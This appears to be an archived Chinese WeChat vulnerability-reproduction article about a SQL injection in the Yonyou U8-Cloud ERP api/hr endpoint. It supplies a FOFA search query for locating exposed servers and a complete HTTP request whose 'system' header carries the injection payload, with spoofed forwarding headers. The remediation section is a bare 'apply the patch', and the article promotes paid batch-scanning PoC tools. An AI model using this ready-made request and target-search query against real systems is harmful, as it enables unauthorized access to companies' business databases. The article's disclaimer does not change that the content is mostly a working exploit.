---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  用友U8-Cloud api/hr接口存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-04-21 23:05  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友U8-Cloud接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友U8 Cloud 提供企业级云ERP整体解决方案，全面支持多组织业务协同，实现企业互联网资源连接。 U8 Cloud 亦是亚太地区成长型企业最广泛采用的云解决方案。  
## 2.漏洞描述  
  
U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。用友U8-Cloud api/hr接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友U8-Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3tCjFsZadttSkrNTmtZLQag4ThjEzxtJIWAdKmfKgo5sJY31mPvqETg/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友U8-Cloud api/hr接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="用友-U8-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/u8cloud/api/hr  
  
漏洞数据包：  
```
GET /u8cloud/api/hr HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: Keep-Alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
system: -1' or 1=@@version--+
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM374BXLqricOhGhvszicn2Ks9FUMBrVTeGFxicA5uDtYuq2DF6A3aCicUDtg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3wGSsnSl5uWTZmbnbncqM4nHTSeNcnGukiaNWmg72f8iad3gRQoJc4sYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM33hnZADg8p59wVe0y28YSIJgH54FibFU7bqEicncKYuz2A9fF0TibzQRjg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM356IwM0372RYVgWluAf5eNNXavOXC01XJUqYYncWHkMRsrbpHe0aWCw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM35iaNkcoKgdF1L1zicCX8eUx7jx03xeV51SiaTiaQkI3Bdlk7fzvTvYd53g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3g5RLL5K80xDV1PQUlvIFG0TJADd2WBuk2c6ynYLKnictsgaPqibfp1vA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3KC8jibv6wmD90BxcV9CmOgh19QbokJpAOlaJWlJkMNFFoysMfgQJib0w/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[SpringBlade dict-biz/list接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486270&idx=1&sn=42c4ed99574402368042d8c559a9ee64&chksm=974b8639a03c0f2f7c80478a0be180078d0ff486e35e86d17873045a4ccda5c59cb8ad191b96&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
